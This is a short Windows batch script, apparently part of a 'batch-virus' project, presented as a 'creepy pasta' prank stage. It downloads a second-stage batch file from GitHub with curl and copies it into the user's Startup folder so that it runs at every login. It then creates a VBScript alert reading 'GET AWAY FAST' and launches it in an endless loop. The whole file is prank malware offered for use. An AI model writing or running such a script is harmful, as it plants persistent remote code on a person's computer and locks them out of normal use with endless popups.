@echo off

REM Creepy pasta stuff thing

curl -O https://github.com/DiamondBroPlayz/batch-virus/raw/main/Modes/creepypastastage2.bat
xcopy "C:\Temp\Microsoft Windows\creepypastastage2.bat" "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"


cd "%systemdrive%\Temp\Microsoft Windows"

echo MsgBox "GET AWAY FAST",64," " >> vbsalert.vbs
:1
vbsalert.vbs
goto 1